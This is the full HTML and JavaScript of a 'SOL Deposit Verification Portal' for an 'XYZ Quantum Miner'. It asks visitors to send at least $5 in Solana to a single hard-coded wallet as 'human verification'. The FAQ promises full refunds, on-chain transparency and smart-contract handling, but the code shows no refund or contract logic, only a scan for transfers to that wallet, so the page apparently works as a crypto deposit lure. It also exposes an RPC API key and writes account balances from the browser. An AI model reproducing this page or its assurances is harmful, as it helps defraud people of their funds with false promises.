<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>SOL Deposit Verification Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #00f0ff;
      --secondary: #7b2dff;
      --dark: #0a0a20;
      --darker: #050510;
      --light: #e0e0ff;
      --success: #00ffaa;
      --warning: #ffaa00;
      --error: #ff3d54;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Roboto', sans-serif;
      background-color: var(--darker);
      color: var(--light);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
      background-image: 
        radial-gradient(circle at 25% 25%, rgba(123, 45, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 75% 75%, rgba(0, 240, 255, 0.1) 0%, transparent 50%);
      overflow-x: hidden;
    }
    
    .container {
      width: 100%;
      max-width: 800px;
      background: rgba(10, 10, 32, 0.8);
      border-radius: 16px;
      border: 1px solid rgba(0, 240, 255, 0.2);
      box-shadow: 0 0 30px rgba(0, 240, 255, 0.1);
      backdrop-filter: blur(10px);
      padding: 2rem;
      margin: 2rem 0;
      position: relative;
      overflow: hidden;
      transform: translateY(20px);
      opacity: 0;
      animation: fadeInUp 0.8s forwards 0.3s;
    }
    
    .container::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
    }
    
    h1, h2, h3 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
      margin-bottom: 1.5rem;
    }
    
    h1 {
      font-size: 2.5rem;
      text-align: center;
      margin-bottom: 2rem;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      position: relative;
      padding-bottom: 0.5rem;
    }
    
    h1::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      border-radius: 3px;
    }
    
    .info-card {
      background: rgba(0, 240, 255, 0.05);
      border: 1px solid rgba(0, 240, 255, 0.2);
      border-radius: 12px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
    }
    
    .info-card:hover {
      border-color: var(--primary);
      box-shadow: 0 0 20px rgba(0, 240, 255, 0.2);
    }
    
    .info-card::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(0, 240, 255, 0.1) 0%, transparent 70%);
      transform: rotate(30deg);
      z-index: -1;
    }
    
    strong {
      color: var(--primary);
      font-weight: 500;
    }
    
    #registeredWallet {
      font-family: monospace;
      background: rgba(0, 0, 0, 0.3);
      padding: 0.5rem 1rem;
      border-radius: 6px;
      border-left: 3px solid var(--primary);
      word-break: break-all;
      display: inline-block;
      margin-top: 0.5rem;
      transition: all 0.3s ease;
    }
    
    button {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: var(--darker);
      border: none;
      padding: 0.8rem 1.8rem;
      font-family: 'Orbitron', sans-serif;
      font-weight: 500;
      border-radius: 50px;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
      box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 0.9rem;
      margin-top: 1rem;
      transform: translateY(0);
    }
    
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 0 25px rgba(0, 240, 255, 0.5);
    }
    
    button:active {
      transform: translateY(1px);
    }
    
    button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: 0.5s;
    }
    
    button:hover::before {
      left: 100%;
    }
    
    #verifyButton {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      width: 100%;
    }
    
    /* Modal styles */
    #modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(5px);
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      transition: opacity 0.3s ease;
    }
    
    #modal.show {
      display: flex;
      opacity: 1;
    }
    
    #modalContent {
      background: var(--dark);
      padding: 2rem;
      border-radius: 16px;
      border: 1px solid var(--primary);
      box-shadow: 0 0 30px rgba(0, 240, 255, 0.3);
      max-width: 500px;
      width: 90%;
      position: relative;
      transform: scale(0.9);
      opacity: 0;
      transition: all 0.3s ease;
    }
    
    #modal.show #modalContent {
      transform: scale(1);
      opacity: 1;
    }
    
    #modalContent::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
    }
    
    #walletInput {
      width: 100%;
      padding: 1rem;
      margin: 1.5rem 0;
      background: rgba(0, 240, 255, 0.05);
      border: 1px solid rgba(0, 240, 255, 0.3);
      border-radius: 8px;
      color: var(--light);
      font-family: monospace;
      font-size: 1rem;
      transition: all 0.3s ease;
    }
    
    #walletInput:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
    }
    
    .button-group {
      display: flex;
      gap: 1rem;
      justify-content: flex-end;
    }
    
    /* Loading spinner */
    .spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: var(--light);
      animation: spin 1s ease-in-out infinite;
      display: none;
    }
    
    .spinner.active {
      display: block;
    }
    
    /* Status indicators */
    .status {
      padding: 1rem;
      border-radius: 8px;
      margin: 1rem 0;
      display: none;
      animation: fadeIn 0.5s ease;
    }
    
    .status.success {
      background: rgba(0, 255, 170, 0.1);
      border: 1px solid var(--success);
      color: var(--success);
      display: block;
    }
    
    .status.error {
      background: rgba(255, 61, 84, 0.1);
      border: 1px solid var(--error);
      color: var(--error);
      display: block;
    }
    
    .status.warning {
      background: rgba(255, 170, 0, 0.1);
      border: 1px solid var(--warning);
      color: var(--warning);
      display: block;
    }
    
    /* Animations */
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    @keyframes fadeIn {
      from {
        opacity: 0;
      }
      to {
        opacity: 1;
      }
    }
    
    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
    
    /* Floating particles */
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -1;
    }
    
    .particle {
      position: absolute;
      background: rgba(0, 240, 255, 0.5);
      border-radius: 50%;
      animation: float linear infinite;
    }
    
    @keyframes float {
      0% {
        transform: translateY(0) translateX(0);
        opacity: 1;
      }
      100% {
        transform: translateY(-100vh) translateX(100px);
        opacity: 0;
      }
    }
    
    /* Responsive */
    @media (max-width: 768px) {
      .container {
        padding: 1.5rem;
      }
      
      h1 {
        font-size: 2rem;
      }
      /* Floating FAQ Button */
.floating-faq-button {
    position: fixed;
    bottom:20%;
    right: 10px;
    width: 20px;
    height: 20px;
    background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 0 20px rgba(0, 247, 255, 0.4);
    transition: all 0.3s ease;
    animation: float 3s ease-in-out infinite;
}

.floating-faq-button:hover {
    transform: scale(1.1) translateY(-5px);
    box-shadow: 0 0 30px rgba(167, 119, 227, 0.6);
}

.faq-chevron {
    color: white;
    font-size: 14px;
    font-weight: bold;
    transition: all 0.3s ease;
}

.floating-faq-button:hover .faq-chevron {
    transform: rotate(360deg);
}

.pulse-ring {
    position: absolute;
    width: 100%;
    height: 100%;
    border: 2px solid var(--neon-blue);
    border-radius: 50%;
    animation: pulse 2s ease-out infinite;
    opacity: 0;
}

@keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-10px); }
}

@keyframes pulse {
    0% { transform: scale(0.9); opacity: 0.7; }
    70% { transform: scale(1.3); opacity: 0; }
    100% { opacity: 0; }
}

/* FAQ Modal Styles */
.faq-modal {
    display: none;
    position: fixed;
    z-index: 1001;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(5, 5, 16, 0.9);
    backdrop-filter: blur(5px);
    overflow: hidden;
    animation: fadeIn 0.3s ease-out;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

.faq-modal-content {
    background: var(--darker-bg);
    margin: 5% auto;
    padding: 0;
    width: 90%;
    max-width: 700px;
    border-radius: 12px;
    box-shadow: 0 0 30px rgba(0, 247, 255, 0.2);
    border: 1px solid rgba(0, 247, 255, 0.2);
    position: relative;
    overflow: hidden;
}

.faq-modal-content::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 3px;
    background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
}

.faq-modal-header {
    padding: 20px;
    background: rgba(10, 10, 20, 0.8);
    border-bottom: 1px solid rgba(0, 247, 255, 0.1);
    position: relative;
}

.faq-modal-header h3 {
    color: var(--neon-blue);
    font-family: 'Orbitron', sans-serif;
    text-shadow: 0 0 10px rgba(0, 247, 255, 0.3);
    display: flex;
    align-items: center;
    gap: 10px;
}

.faq-close-btn {
    position: absolute;
    right: 20px;
    top: 20px;
    color: var(--neon-purple);
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s ease;
}

.faq-close-btn:hover {
    color: var(--neon-blue);
    transform: scale(1.2);
}

.faq-modal-body {
    padding: 0;
}

.faq-scroll-container {
    max-height: 70vh;
    overflow-y: auto;
    padding: 15px;
}

/* FAQ Item Styles */
.faq-item {
    margin-bottom: 15px;
    border-radius: 8px;
    overflow: hidden;
    background: rgba(20, 20, 40, 0.6);
    border: 1px solid rgba(0, 247, 255, 0.1);
    transition: all 0.3s ease;
}

.faq-item:hover {
    border-color: var(--neon-purple);
    box-shadow: 0 0 15px rgba(167, 119, 227, 0.2);
}

.faq-question {
    color: var(--neon-green);
    font-weight: 600;
    padding: 15px;
    display: flex;
    align-items: center;
    cursor: pointer;
    gap: 10px;
    transition: all 0.3s ease;
}

.faq-question:hover {
    color: var(--neon-blue);
    background: rgba(0, 247, 255, 0.05);
}

.faq-question i:first-child {
    color: var(--neon-purple);
    width: 20px;
    text-align: center;
}

.faq-question .fa-chevron-down {
    margin-left: auto;
    transition: transform 0.3s ease;
    font-size: 0.9rem;
    color: var(--neon-blue);
}

.faq-answer {
    max-height: 0;
    overflow: hidden;
    transition: max-height 0.3s ease;
    background: rgba(15, 15, 35, 0.7);
}

.faq-answer p {
    padding: 0 20px 20px 50px;
    margin: 0;
    line-height: 1.6;
    color: rgba(240, 240, 240, 0.9);
}
.faq-answer li {
    padding: 0 20px 20px 50px;
    margin: 0;
    line-height: 1.6;
    color: rgba(240, 240, 240, 0.9);
    font-weight: bold;
}

.faq-item.active .faq-answer {
    max-height: 500px;
    padding: 0;
}

.faq-item.active .faq-question .fa-chevron-down {
    transform: rotate(180deg);
}

/* Scrollbar styling */
.faq-scroll-container::-webkit-scrollbar {
    width: 6px;
}

.faq-scroll-container::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.1);
}

.faq-scroll-container::-webkit-scrollbar-thumb {
    background: var(--neon-purple);
    border-radius: 3px;
}

.faq-scroll-container::-webkit-scrollbar-thumb:hover {
    background: var(--neon-blue);
}

@media (max-width: 768px) {
    .floating-faq-button {
        bottom: 20px;
        right: 20px;
        width: 50px;
        height: 50px;
    }
    
    .faq-modal-content {
        width: 95%;
        margin: 10% auto;
    }
    
    .faq-question {
        padding: 12px;
        font-size: 0.95rem;
    }
    
    .faq-answer p {
        padding: 0 15px 15px 45px;
        font-size: 0.9rem;
    }
}
   
  </style>
</head>
<body>
  <div class="particles" id="particles"></div>
  <h1>SOL DEPOSIT VERIFICATION</h1>
  <h6> Send ≥$5 Solana on your deposit solana address using your registered Solana wallet address, then verify.</h6>
  
  <div class="container">
    <div class="info-card">
      <h2>Wallet Information</h2>
      <p><strong>Registered Solana Wallet Address:</strong></p>
      <span id="registeredWallet">Loading...</span>
    </div>
    
    <div id="statusMessage" class="status"></div>
        <button id="verifyButton">
      <span>Verify Transaction</span>
      <div class="spinner" id="verifySpinner"></div>
    </button>
  </div>
  
  <div id="xyzFaqButton" class="floating-faq-button">
    <div class="faq-chevron">?</div>
    <div class="pulse-ring"></div>
</div>  
  <!-- Modal for wallet registration -->
  <div id="modal">
    <div id="modalContent">
      <h3>Register Solana Wallet</h3>
      <p>Please enter your Solana wallet address to receive deposits:</p>
      <input id="walletInput" placeholder="Enter your Solana wallet address" />
      
      <div class="button-group">
        <button id="confirmWallet">
          <span>Confirm Address</span>
          <div class="spinner" id="confirmSpinner"></div>
        </button>
      </div>
    </div>
  </div>
  <div id="xyzFaqModal" class="faq-modal">
    <div class="faq-modal-content">
        <div class="faq-modal-header">
            <h3><i class="fas fa-atom"></i> XYZ Quantum Miner FAQ</h3>
            <span id="xyzFaqClose" class="faq-close-btn">&times;</span>
        </div>
        <div class="faq-modal-body">
            <div class="faq-scroll-container">
                <div class="faq-item">
                    <div class="faq-question">
                        <i class="fas fa-question-circle"></i>
                        Will my deposited Solana be refunded?
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p><strong>Yes, your total deposited Solana will be fully refunded during distribution.</strong></p>
                        <p>Every SOL you deposit will be accounted for and returned to your registered wallet address when the distribution period begins. This is not a purchase - it's a verification of your wallet address and humanity.</p>
                        <p>The refund will be processed automatically to the same wallet address you used for deposit.</p>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question">
                        <i class="fas fa-microchip"></i>
                        How is Solana used for gas fees?
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p><strong>A small portion of your deposit will be used to cover network gas fees.</strong></p>
                        <p>Solana blockchain transactions require gas fees (transaction fees) to process. These fees are minimal but necessary for:</p>
                        <ul>                           
                            <li>•Verifying your deposit transaction</li>
                            <li>•Processing your eventual refund</li>
                            <li>•Maintaining network security</li>
                        </ul>
                        <p>The exact amount used for gas will be transparently displayed in your transaction history.</p>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question">
                        <i class="fab fa-solana"></i>
                        Why do I need to deposit Solana?
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p><strong>The Solana deposit serves two important purposes:</strong></p>
                        <p>1. <strong>Human Verification:</strong> This process helps us confirm you're a real person and not a bot or automated system. The blockchain interaction creates a unique fingerprint that's difficult to fake at scale.</p>
                        <p>2. <strong>Wallet Authentication:</strong> By depositing from your wallet, you're proving ownership of that address, which ensures your rewards and refunds go to the right place.</p>
                        <p>This method effectively discourages bot farmers and ensures fair distribution to genuine participants.</p>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question">
                        <i class="fas fa-wifi"></i>
                        What is the minimum deposit amount?
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p><strong>The minimum deposit amount is $5 worth of Solana.</strong></p>
                        <p>This amount is set to:</p>
                        <ul>
                            <li>•Ensure meaningful participation</li>
                            <li>•Cover network transaction costs</li>
                            <li>•Maintain system security against spam</li>
                        </ul>
                        <p>You can deposit more than the minimum amount if you wish.</p>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question">
                        <i class="fas fa-clock"></i>
                        When will distributions occur?
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p><strong>Distributions occur at regular intervals as announced.</strong></p>
                        <p>You'll receive notifications about:</p>
                        <ul>
                            <li>•Upcoming distribution dates</li>
                            <li>•Exact refund amounts</li>
                            <li>•Transaction status updates</li>
                        </ul>
                        <p>All distributions are processed on-chain for complete transparency.</p>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question">
                        <i class="fas fa-tachometer-alt"></i>
                        Is the deposit system secure?
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p><strong>Yes, the deposit and refund system is designed with full on-chain transparency.</strong></p>
                        <p>All transactions are visible on the Solana blockchain, meaning you can verify deposits, refunds, and gas usage independently. We do not store your private keys, and all logic is driven by smart contract infrastructure.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
  
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getFirestore, doc, getDoc, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
    import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

    // Create floating particles
    function createParticles() {
      const particlesContainer = document.getElementById('particles');
      const particleCount = 30;
      
      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        // Random size between 1px and 3px
        const size = Math.random() * 2 + 1;
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        
        // Random position
        particle.style.left = `${Math.random() * 100}vw`;
        particle.style.top = `${Math.random() * 100}vh`;
        
        // Random animation duration and delay
        const duration = Math.random() * 20 + 10;
        const delay = Math.random() * 5;
        particle.style.animation = `float ${duration}s linear ${delay}s infinite`;
        
        particlesContainer.appendChild(particle);
      }
    }
    
    // Show status message
    function showStatus(message, type) {
      const statusElement = document.getElementById('statusMessage');
      statusElement.textContent = message;
      statusElement.className = `status ${type}`;
      
      // Auto-hide after 5 seconds
      if (type !== 'error') {
        setTimeout(() => {
          statusElement.className = 'status';
        }, 5000);
      }
    }
    
    // Initialize Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyDIwoUIMJrJQeLBD9vijsfIUXG9BgaGSPs",
      authDomain: "miner-zyx.firebaseapp.com",
      projectId: "miner-zyx",
      storageBucket: "miner-zyx.appspot.com",
      messagingSenderId: "430019680448",
      appId: "1:430019680448:web:d066b8aaf4355907e1b525",
      measurementId: "G-V6SDWYH6M2"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const auth = getAuth(app);
    const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=ffa4267c-d28d-4bce-baf4-6cca12c26952";
    const RECEIVER = "G3pqBoPrdS72ZYrD5umgsuMWx3sUhsCsmuC8PWgjxoLW";

    const uid = localStorage.getItem("xyzUidAccess");
    const email = localStorage.getItem("xyzEmailAccess");

    const registeredWalletSpan = document.getElementById("registeredWallet");
    const modal = document.getElementById("modal");
    const walletInput = document.getElementById("walletInput");
    const confirmWallet = document.getElementById("confirmWallet");
    const verifyButton = document.getElementById("verifyButton");
    const verifySpinner = document.getElementById("verifySpinner");
    const confirmSpinner = document.getElementById("confirmSpinner");

    // Create particles on load
    createParticles();
    
    // Initialize with fade-in animation
    document.body.style.opacity = 0;
    setTimeout(() => {
      document.body.style.transition = 'opacity 0.8s ease';
      document.body.style.opacity = 1;
    }, 100);

    onAuthStateChanged(auth, async (user) => {
      if (!user) {
        try {
          await signInAnonymously(auth);
        } catch (error) {
          showStatus("Failed to initialize session. Please refresh.", "error");
          console.error("Authentication error:", error);
        }
        return;
      }

      const userRef = doc(db, "documentXYZ", uid);
      
      try {
        const userSnap = await getDoc(userRef);
        
        if (!userSnap.exists()) {
          showStatus("User account not found in database.", "error");
          return;
        }

        const data = userSnap.data();
        if (data.xyzSolAddress) {
          registeredWalletSpan.textContent = data.xyzSolAddress;
          showStatus("Wallet address loaded successfully.", "success");
        } else {
          // Show modal with animation
          modal.classList.add('show');
        }
      } catch (error) {
        showStatus("Error loading wallet information.", "error");
        console.error("Database error:", error);
      }
    });

    confirmWallet.addEventListener("click", async () => {
      const newAddress = walletInput.value.trim();
      if (!newAddress) {
        showStatus("Please enter a Solana wallet address.", "error");
        return;
      }

      // Basic validation for Solana address length
      if (newAddress.length < 32 || newAddress.length > 44) {
        showStatus("This doesn't look like a valid Solana address.", "error");
        return;
      }

      const confirm = window.confirm(`Please confirm this is your correct Solana wallet address:\n\n${newAddress}\n\nYou will NOT be able to change it after confirmation.`);
      if (!confirm) return;

      confirmSpinner.classList.add('active');
      confirmWallet.disabled = true;
      
      try {
        const userRef = doc(db, "documentXYZ", uid);
        await updateDoc(userRef, { xyzSolAddress: newAddress });
        
        registeredWalletSpan.textContent = newAddress;
        showStatus("Wallet address registered successfully!", "success");
        
        // Hide modal with animation
        modal.classList.remove('show');
        setTimeout(() => {
          modal.style.display = 'none';
        }, 300);
      } catch (error) {
        showStatus("Failed to save wallet address. Please try again.", "error");
        console.error("Update error:", error);
      } finally {
        confirmSpinner.classList.remove('active');
        confirmWallet.disabled = false;
      }
    });

    verifyButton.addEventListener("click", async () => {
      verifySpinner.classList.add('active');
      verifyButton.disabled = true;
      
      try {
        const userRef = doc(db, "documentXYZ", uid);
        const userSnap = await getDoc(userRef);
        
        if (!userSnap.exists()) {
          showStatus("User account not found.", "error");
          return;
        }
        
        const data = userSnap.data();
        const userWallet = data.xyzSolAddress;
        
        if (!userWallet) {
          showStatus("No wallet registered. Please register first.", "error");
          return;
        }

        showStatus("Scanning blockchain for transactions...", "warning");
        
        const txListRes = await fetch(HELIUS_RPC, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: "tx-list",
            method: "getSignaturesForAddress",
            params: [userWallet, { limit: 10 }]
          })
        });

        const txList = await txListRes.json();
        const recentTxs = txList.result;
        
        if (!recentTxs || recentTxs.length === 0) {
          showStatus("No recent transactions found for this wallet.", "warning");
          return;
        }

        let foundNew = false;

        for (const tx of recentTxs) {
          const txHash = tx.signature;
          const existing = await getDoc(doc(db, "xyzSolDeposit", txHash));
          
          if (existing.exists()) continue;

          const txDetailRes = await fetch(HELIUS_RPC, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              jsonrpc: "2.0",
              id: "tx-details",
              method: "getTransaction",
              params: [txHash, { encoding: "jsonParsed", commitment: "confirmed" }]
            })
          });

const txDetails = await txDetailRes.json();
          const instructions = txDetails?.result?.transaction?.message?.instructions || [];

          for (const ix of instructions) {
            const parsed = ix.parsed;
            if (parsed?.type === "transfer" && parsed.info.destination === RECEIVER) {
              const amount = parseFloat(parsed.info.lamports) / 1e9;

              await setDoc(doc(db, "xyzSolDeposit", txHash), {
                amount,
                email,
                uid,
                timestamp: new Date()
              });

              const previous = data.solBalance || 0;
              await updateDoc(userRef, { solBalance: previous + amount });

              showStatus(`✅ Success! ${amount} SOL deposit verified and added to your account.`, "success");
              foundNew = true;
              break;
            }
          }
        }

        if (!foundNew) {
          showStatus("No new SOL deposits found in recent transactions.", "warning");
        }
      } catch (error) {
        showStatus("Error verifying transactions. Please try again.", "error");
        console.error("Verification error:", error);
      } finally {
        verifySpinner.classList.remove('active');
        verifyButton.disabled = false;
      }
    });
    
    // Close modal when clicking outside
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.classList.remove('show');
        setTimeout(() => {
          modal.style.display = 'none';
        }, 300);
      }
    });
    
    
// Redirect to login if either email or UID is missing
if (!email || !uid) {
  window.location.href = "tryn.html"; // Replace with your login URL
}

// FAQ Modal Functionality
const faqModal = document.getElementById("xyzFaqModal");
const faqButton = document.getElementById("xyzFaqButton");
const faqCloseBtn = document.getElementById("xyzFaqClose");

function openFaqModal() {
    faqModal.style.display = "block";
    document.body.style.overflow = "hidden";
}

function closeFaqModal() {
    faqModal.style.display = "none";
    document.body.style.overflow = "auto";
}

faqButton.onclick = openFaqModal;
faqCloseBtn.onclick = closeFaqModal;

window.onclick = function(event) {
    if (event.target == faqModal) {
        closeFaqModal();
    }
}

// FAQ Toggle Functionality
document.querySelectorAll('.faq-question').forEach(question => {
    question.addEventListener('click', () => {
        const faqItem = question.parentElement;
        faqItem.classList.toggle('active');
        
        // Close other open FAQs
        document.querySelectorAll('.faq-item').forEach(item => {
            if (item !== faqItem && item.classList.contains('active')) {
                item.classList.remove('active');
            }
        });
    });
});

// Close modal when pressing Escape key
document.addEventListener('keydown', function(event) {
    if (event.key === "Escape") {
        closeFaqModal();
    }
});

    
   </script>
</body>
</html>
